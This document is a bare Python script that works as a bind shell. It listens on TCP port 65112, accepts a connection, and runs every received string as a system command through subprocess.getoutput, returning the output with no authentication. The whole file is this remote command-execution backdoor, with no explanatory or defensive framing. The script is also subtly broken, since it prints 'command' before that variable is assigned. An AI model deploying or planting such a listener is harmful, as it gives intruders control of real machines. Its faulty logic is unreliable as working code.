import socket                   
import subprocess
s=socket.socket()
host=socket.gethostname()
port=65112
s.bind((host,port))
print("Waiting for connection")
s.listen(5)
conn,addr=s.accept()
while True:
    conn.send("Command to be executed:".encode())
    print("Command to be excuted:",command)
    command=conn.recv(1024).decode()
    if command!="exit":
        cmd=subprocess.getoutput(command)
        conn.send(cmd.encode())
    else:
        break
conn.close()
s.close()